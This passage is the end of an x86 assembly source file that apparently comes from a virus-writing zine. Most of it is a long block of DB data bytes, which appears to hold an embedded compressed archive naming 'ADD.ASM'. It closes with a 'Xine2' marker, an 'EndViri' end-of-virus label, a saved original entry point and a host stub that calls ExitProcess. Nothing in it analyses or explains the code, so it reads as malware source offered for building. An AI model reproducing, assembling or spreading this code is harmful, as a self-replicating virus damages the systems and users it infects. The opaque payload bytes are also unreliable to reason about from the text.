           DB   189,134,96,175,176,233,98,1,26,108,133,174,135,7,134,7,28,225,8
           DB   53,131,236,164,93,17,75,149,13,41,164,174,158,187,74,155,54,52
           DB   24,174,121,188,143,112,102,250,98,173,195,243,115,135,167,255,174
           DB   163,43,87,195,233,151,225,200,187,218,9,6,173,62,132,193,45,35
           DB   235,235,135,145,206,81,70,28,241,216,217,25,59,146,54,209,163,88
           DB   186,228,255,29,31,21,6,208,12,13,32,87,210,29,56,11,109,238,106
           DB   132,148,44,90,248,232,137,25,217,218,187,64,100,186,43,142,33,174
           DB   209,4,181,232,244,97,248,201,86,62,58,192,113,211,242,222,95,187
           DB   224,12,90,182,130,176,231,103,0,121,167,215,24,173,118,28,110,87
           DB   85,112,204,203,19,172,58,219,141,229,203,189,108,167,163,229,142
           DB   170,238,217,118,2,83,24,22,22,32,11,74,180,77,134,24,116,164,192
           DB   196,87,236,29,158,221,67,231,22,157,200,108,89,250,188,218,113
           DB   32,171,89,135,43,55,148,63,185,39,199,169,130,11,106,140,48,3,149
           DB   165,143,13,42,42,198,80,120,7,198,200,224,177,197,249,61,166,28
           DB   51,187,181,242,27,120,80,24,13,152,83,10,211,91,199,152,57,55,30
           DB   221,200,211,20,34,91,206,197,11,101,109,228,81,51,205,168,13,203
           DB   215,191,110,105,234,188,128,163,50,36,211,27,158,159,79,60,10,243
           DB   97,24,240,194,235,159,217,91,93,255,236,172,212,119,239,71,77,140
           DB   143,70,158,37,141,178,229,141,81,137,13,112,100,99,133,134,197
           DB   35,31,70,42,19,64,145,244,209,116,44,129,76,6,47,228,112,55,45
           DB   180,136,142,95,191,38,182,235,149,101,33,35,15,211,116,85,81,30
           DB   222,62,36,202,236,158,44,37,17,115,91,108,60,180,94,108,29,163
           DB   183,134,211,72,164,123,36,84,201,158,26,212,234,77,33,212,23,32
           DB   209,135,119,68,211,106,48,120,84,39,115,111,50,108,166,21,66,169
           DB   111,239,105,40,65,75,48,154,37,74,118,175,57,180,128,109,27,105
           DB   177,66,135,155,146,149,72,17,100,33,37,12,168,176,155,221,187,191
           DB   196,225,245,171,191,212,180,163,197,108,69,107,127,219,234,182
           DB   157,32,99,117,151,76,248,154,44,157,212,103,105,208,132,95,147
           DB   207,35,39,227,24,78,28,156,253,132,214,209,113,251,112,106,246
           DB   180,180,115,96,149,69,68,58,202,50,242,72,226,171,180,80,185,245
           DB   235,48,230,93,138,131,84,103,58,139,90,109,55,45,96,169,85,46,1
           DB   98,224,64,84,54,81,195,95,31,196,29,31,81,81,200,158,185,219,43
           DB   80,243,249,186,152,247,44,52,220,157,27,255,221,109,241,234,77
           DB   129,2,196,165,215,189,115,88,40,210,14,47,193,114,130,236,213,54
           DB   8,29,249,203,27,203,131,143,208,145,192,242,165,48,197,87,205,177
           DB   1,217,31,246,112,202,86,175,41,69,36,2,107,7,15,194,98,124,11,169
           DB   60,42,31,54,136,195,142,144,70,207,248,112,88,197,177,202,253,165
           DB   142,238,60,222,93,238,161,102,199,80,13,113,12,21,171,81,52,250
           DB   9,16,8,225,6,174,119,230,87,93,76,189,150,148,162,184,105,85,166
           DB   237,44,145,89,69,140,160,161,135,240,178,176,65,122,216,64,254
           DB   142,243,213,140,39,200,179,20,136,164,23,1,190,160,122,47,147,180
           DB   64,231,150,234,251,120,17,162,83,187,154,49,249,119,197,159,234
           DB   12,88,134,44,154,236,144,186,196,80,6,121,143,146,239,153,237,53
           DB   180,247,225,74,48,189,177,103,51,205,222,194,190,5,175,206,159
           DB   74,195,154,38,142,179,221,109,236,146,184,130,142,176,27,157,225
           DB   88,81,118,80,174,154,213,113,96,233,248,228,147,201,182,107,197
           DB   142,49,178,94,213,227,205,164,106,102,200,178,173,170,199,80,109
           DB   11,125,242,2,222,238,193,182,230,31,161,250,54,118,88,10,58,208
           DB   131,78,50,134,125,131,128,130,25,169,83,8,36,251,20,166,87,190
           DB   14,76,105,89,114,199,148,33,133,2,171,227,98,77,30,87,85,223,190
           DB   113,76,122,84,186,122,52,242,184,160,253,230,241,210,14,150,211
           DB   150,80,200,60,204,138,114,151,154,238,99,20,141,173,83,158,162
           DB   174,26,181,166,69,212,139,81,166,28,111,90,218,36,232,65,177,97
           DB   56,165,99,188,52,44,108,128,1,247,203,16,78,227,126,255,182,158
           DB   9,236,185,139,65,21,120,15,170,234,130,217,211,176,49,2,221,43
           DB   20,81,88,0,54,169,208,102,40,237,121,29,183,158,225,27,12,170,21
           DB   166,191,198,247,9,58,219,80,234,209,29,230,111,117,2,69,213,35
           DB   106,89,95,243,6,154,151,146,24,182,154,236,184,158,124,1,239,192
           DB   166,199,147,247,156,76,168,196,49,206,190,142,65,33,180,105,216
           DB   188,192,37,235,60,41,26,143,219,9,102,208,80,247,85,5,118,71,85
           DB   134,124,26,99,205,175,38,152,233,5,165,160,55,118,122,130,41,75
           DB   187,6,5,205,211,130,33,170,203,43,95,55,154,171,37,91,33,142,85
           DB   49,118,134,238,242,202,192,142,181,243,224,0,250,255,183,102,139
           DB   222,73,173,59,85,128,0,166,118,129,246,236,32,12,202,220,190,150
           DB   119,229,87,163,213,98,184,231,41,164,108,214,251,133,252,103,169
           DB   113,141,17,153,199,207,179,84,33,150,148,60,85,216,10,32,109,180
           DB   61,119,208,73,23,106,88,231,9,26,218,53,26,16,110,238,139,180,112
           DB   167,189,180,182,8,50,106,204,4,18,182,81,41,82,202,197,174,19,126
           DB   23,10,155,73,44,13,187,107,233,201,252,222,27,122,178,20,189,30
           DB   254,209,26,222,86,230,127,160,125,248,2,142,222,90,179,177,2,88
           DB   74,244,200,178,95,197,182,3,88,49,235,191,131,17,15,205,1,110,182
           DB   133,119,53,37,74,42,229,233,42,124,98,205,7,167,3,179,72,248,183
           DB   105,227,158,84,174,116,219,242,116,160,135,13,116,240,235,147,201
           DB   54,89,88,61,69,57,214,38,240,20,229,160,234,149,30,240,253,182
           DB   218,115,164,237,181,103,153,69,69,144,73,133,192,10,195,168,137
           DB   12,53,136,196,44,54,52,123,105,194,21,150,187,184,110,240,78,220
           DB   94,155,92,112,79,213,174,235,18,107,244,203,103,28,75,132,23,116
           DB   218,132,61,97,145,1,122,84,195,79,7,16,76,42,221,28,248,216,163
           DB   68,171,194,187,171,97,179,74,168,41,68,85,79,96,19,166,4,252,248
           DB   69,238,28,59,107,108,86,165,70,199,142,239,228,212,245,218,252
           DB   47,212,167,65,216,87,169,80,219,90,217,65,55,75,225,124,3,233,168
           DB   118,76,213,6,224,188,201,90,208,168,184,172,244,176,213,165,235
           DB   95,84,90,71,85,170,96,141,181,99,236,60,76,248,183,176,124,112
           DB   223,197,5,160,138,142,72,248,41,40,132,143,31,154,188,137,79,92
           DB   246,199,191,121,96,197,54,157,212,169,131,233,67,8,68,88,130,27
           DB   231,171,244,145,40,236,7,42,1,21,83,2,61,171,238,99,64,110,246
           DB   144,10,129,42,52,197,211,161,238,128,121,186,100,9,75,50,158,132
           DB   105,230,91,115,199,147,29,109,104,183,187,109,224,91,83,35,135
           DB   190,33,166,18,138,130,185,167,48,233,27,202,215,119,237,140,189
           DB   166,161,205,85,52,125,29,121,44,98,255,234,164,27,185,214,170,228
           DB   107,134,69,66,122,119,86,213,26,90,63,184,124,94,223,80,103,81
           DB   107,102,153,85,181,208,226,174,29,158,252,250,102,167,31,248,204
           DB   138,30,218,177,135,106,228,190,209,99,199,255,7,58,124,122,114
           DB   120,224,53,36,167,84,100,80,23,13,212,60,50,31,195,238,202,42,197
           DB   245,137,56,187,107,8,5,233,224,188,42,58,208,33,120,44,30,56,129
           DB   38,83,109,45,214,118,185,151,9,229,147,84,209,10,189,251,14,159
           DB   50,33,247,205,213,11,24,183,160,179,104,145,216,80,149,25,109,162
           DB   113,6,221,14,81,32,213,121,222,128,42,218,169,120,131,126,168,131
           DB   183,184,93,74,8,51,122,25,168,26,49,149,156,50,167,19,195,20,96
           DB   197,179,165,216,33,241,79,194,84,227,245,115,231,152,163,153,237
           DB   71,240,14,207,195,234,99,41,176,98,152,212,234,249,75,249,56,225
           DB   255,204,195,4,171,106,212,67,202,100,96,9,56,144,217,48,23,201
           DB   74,78,64,157,56,122,7,111,142,97,22,210,207,14,254,92,165,129,72
           DB   85,67,236,34,187,7,233,73,96,44,65,98,24,114,191,116,97,94,36,196
           DB   45,206,86,29,5,227,178,105,168,155,42,151,215,138,223,205,209,28
           DB   40,2,183,42,225,168,36,175,23,80,178,168,71,6,167,19,155,236,249
           DB   248,40,143,137,238,120,46,10,31,205,177,218,20,15,90,26,238,150
           DB   29,223,169,239,90,191,200,71,120,44,198,57,65,128,194,120,68,242
           DB   120,126,213,255,224,217,85,210,221,211,139,195,131,9,247,47,148
           DB   97,166,141,102,229,149,195,143,152,152,248,177,213,86,127,160,220
           DB   169,148,119,104,162,35,72,148,195,3,5,225,156,14,112,217,53,199
           DB   111,220,35,94,37,144,177,81,140,40,133,94,81,88,76,50,206,183,220
           DB   65,228,167,87,222,53,150,169,42,5,160,42,97,44,129,183,213,38,142
           DB   165,89,101,111,153,34,141,81,57,207,224,184,234,100,195,161,83
           DB   146,43,105,248,233,149,236,209,172,184,234,241,230,74,208,179,240
           DB   79,82,10,181,212,35,129,206,67,179,91,7,150,251,86,230,168,26,82
           DB   164,65,72,90,21,192,42,186,199,19,19,211,33,76,250,159,60,74,11
           DB   226,177,28,226,140,193,213,185,149,13,44,167,33,97,184,197,244
           DB   77,73,18,191,226,120,153,3,19,131,171,233,23,187,130,205,246,29
           DB   29,219,34,225,217,183,235,47,35,48,63,119,142,207,81,37,160,61
           DB   234,136,143,235,4,235,154,8,163,15,10,9,39,117,193,83,74,222,105
           DB   1,214,49,10,10,177,160,45,167,12,75,58,225,163,6,105,40,177,80
           DB   44,137,69,62,77,44,217,80,183,177,151,113,231,77,219,102,26,182
           DB   44,226,54,132,200,13,11,60,180,176,77,37,74,213,181,163,37,250
           DB   230,5,50,105,32,75,123,234,181,177,20,163,175,118,89,218,108,247
           DB   200,243,145,231,88,19,166,232,0,105,91,79,59,154,90,20,168,135
           DB   22,220,34,148,71,209,225,187,48,43,202,205,9,47,182,18,173,115
           DB   138,178,18,189,21,0,35,52,218,178,85,97,163,153,87,230,52,238,59
           DB   240,243,36,193,112,190,251,166,43,223,232,220,206,220,74,196,28
           DB   30,20,150,218,137,107,53,62,40,217,78,130,73,133,208,9,214,158
           DB   101,58,238,54,26,125,204,181,33,191,199,234,61,122,241,190,121
           DB   233,242,20,131,119,104,24,152,163,133,116,218,69,93,68,161,76,74
           DB   141,154,10,205,26,71,80,235,136,162,192,81,151,38,251,115,82,45
           DB   122,247,54,213,114,251,88,63,104,119,27,104,234,5,215,21,121,47
           DB   202,58,130,109,75,59,182,180,219,63,98,169,119,209,176,24,236,253
           DB   245,191,70,137,211,41,97,174,41,208,171,162,227,119,144,108,29
           DB   251,149,227,174,246,26,14,125,212,39,105,221,56,209,104,6,96,157
           DB   74,97,6,208,144,141,209,198,192,30,112,235,47,23,206,27,44,120
           DB   81,176,3,251,52,121,109,49,125,247,20,120,149,240,245,142,102,251
           DB   236,185,202,153,176,182,13,36,60,10,249,215,191,146,133,164,47
           DB   123,249,214,181,249,151,230,240,11,143,110,159,54,113,171,213,191
           DB   175,218,48,203,5,254,182,85,155,82,173,81,176,109,85,167,87,94
           DB   244,177,107,49,191,183,176,32,253,235,212,87,187,74,121,86,179
           DB   136,1,132,241,156,110,182,56,60,48,197,145,110,161,122,81,185,247
           DB   254,186,5,127,120,239,71,22,17,119,212,233,16,11,207,11,83,190
           DB   129,80,148,169,109,210,86,91,85,222,87,83,86,103,215,53,175,255
           DB   255,140,162,10,172,197,129,69,21,143,173,28,173,210,158,250,195
           DB   118,187,203,218,42,40,14,214,167,62,133,26,195,234,195,198,150
           DB   45,56,246,166,42,154,115,183,13,218,54,52,227,73,181,241,88,70
           DB   231,40,48,103,98,139,162,34,235,12,74,106,46,193,113,17,218,27
           DB   188,148,227,249,116,65,143,28,123,193,179,47,221,78,195,216,102
           DB   162,213,130,38,28,187,203,224,29,124,218,132,241,81,23,58,109,109
           DB   228,84,142,180,60,254,40,192,247,58,72,219,160,210,68,92,92,105
           DB   19,69,116,16,5,159,98,65,229,59,55,52,198,224,248,86,29,112,196
           DB   224,252,127,234,204,154,123,78,213,156,231,33,21,88,36,140,168
           DB   97,121,25,139,80,45,14,15,236,163,94,22,203,237,16,53,187,46,213
           DB   58,216,84,175,77,181,115,248,202,209,119,181,230,190,58,72,203
           DB   191,251,170,143,133,152,195,51,125,199,121,53,187,93,160,157,215
           DB   242,85,36,130,116,3,251,98,218,170,138,6,227,37,120,45,141,185
           DB   179,228,248,9,140,65,103,173,74,24,86,13,204,195,163,23,203,82
           DB   42,78,157,255,178,212,252,131,24,172,121,121,17,76,163,87,239,239
           DB   168,50,52,91,208,190,209,109,213,217,88,143,178,171,120,133,202
           DB   78,94,130,83,67,166,70,20,78,30,117,105,135,118,108,134,123,92
           DB   193,160,93,21,76,105,151,180,76,236,39,101,66,212,202,248,78,147
           DB   251,138,51,108,78,85,80,100,216,226,186,63,97,55,215,53,100,191
           DB   241,206,32,43,231,130,161,38,139,52,177,117,28,212,55,65,167,6
           DB   28,118,188,55,34,64,199,167,241,152,212,3,200,216,185,107,112,170
           DB   33,246,164,165,155,227,3,120,72,124,71,146,123,102,109,58,69,172
           DB   200,126,88,36,184,237,135,69,130,123,230,140,89,148,219,236,40
           DB   40,104,72,71,54,81,239,141,75,55,125,207,192,240,182,56,198,138
           DB   55,58,16,13,45,22,176,57,183,251,214,234,31,9,101,211,107,174,81
           DB   53,239,85,53,217,64,127,55,65,126,87,173,178,216,147,90,223,63
           DB   231,138,144,56,167,140,235,250,181,217,58,176,235,201,43,70,75
           DB   193,235,214,236,118,70,7,169,143,45,177,242,107,79,187,249,149
           DB   27,187,190,109,103,252,182,222,106,83,77,203,8,183,62,1,91,137
           DB   123,251,34,73,240,56,76,121,158,160,39,39,174,174,9,80,103,14,218
           DB   88,126,169,14,143,146,19,163,207,0,91,164,42,191,141,62,78,46,244
           DB   49,6,176,63,61,138,120,14,63,142,203,155,99,26,86,6,61,231,242
           DB   241,181,57,80,172,142,221,53,24,201,147,65,11,47,232,161,179,45
           DB   229,235,203,225,217,228,115,9,168,167,44,9,231,16,134,190,218,70
           DB   123,12,229,25,218,230,51,48,191,219,199,107,155,14,174,244,175
           DB   221,67,43,123,141,131,191,123,160,245,171,55,30,15,199,56,40,125
           DB   57,145,175,20,236,130,27,117,34,209,186,158,231,98,40,255,161,169
           DB   224,61,61,114,34,234,8,143,108,52,254,212,55,231,121,188,235,209
           DB   80,206,238,108,48,246,78,167,195,241,191,131,98,113,53,74,51,25
           DB   113,14,240,2,126,126,123,97,9,33,254,212,148,211,32,229,32,205
           DB   71,86,212,50,116,156,91,95,122,244,219,194,75,118,24,123,147,9
           DB   76,251,239,47,61,67,108,119,221,206,172,254,117,195,1,145,28,76
           DB   118,46,82,67,143,243,193,120,50,53,103,112,134,227,179,193,85,255
           DB   242,41,86,142,154,247,196,230,140,130,197,173,147,160,13,246,69
           DB   104,46,14,117,21,206,104,56,130,38,1,105,220,222,31,164,200,194
           DB   148,218,97,109,179,54,0,220,83,238,15,146,8,167,161,214,248,211
           DB   245,25,157,220,27,124,192,57,239,46,44,54,78,82,105,24,169,99,40
           DB   120,37,138,58,91,110,93,122,227,122,82,20,20,66,85,249,27,207,62
           DB   109,131,167,220,197,181,163,58,81,253,169,206,202,68,96,204,135
           DB   114,102,221,31,15,15,204,149,89,80,185,85,232,175,135,7,234,134
           DB   140,186,147,165,131,80,152,102,238,192,75,40,238,53,117,60,75,122
           DB   123,82,189,193,167,185,208,227,165,125,167,64,221,21,197,250,94
           DB   231,190,167,24,6,42,165,75,11,173,28,178,242,134,223,167,148,253
           DB   210,157,178,197,205,106,245,109,217,32,99,55,106,168,150,85,55
           DB   222,100,60,89,133,120,23,93,106,238,78,192,11,79,157,213,48,199
           DB   48,212,109,35,248,231,127,0,80,75,1,2,20,0,20,0,0,0,8,0,242,170
           DB   119,32,167,184,152,155,109,25,0,0,63,90,0,0,7,0,0,0,0,0,0,0,1,0
           DB   32,0,0,0,0,0,0,0,65,68,68,46,65,83,77,80,75,5,6,0,0,0,0,1,0,1,0
           DB   53,0,0,0,146,25,0,0,0,0




                   db              'Xine2'
   EndViri         equ     $
   oldip           dd      offset fini1 -  400000h
   fini1:

           push    LARGE -1
           ;call    dword ptr edi          ;when I used the routine to locate
                                           ;the ExitProcess address
           call    ExitProcess             ;this simply terminates the program

            end     HOST
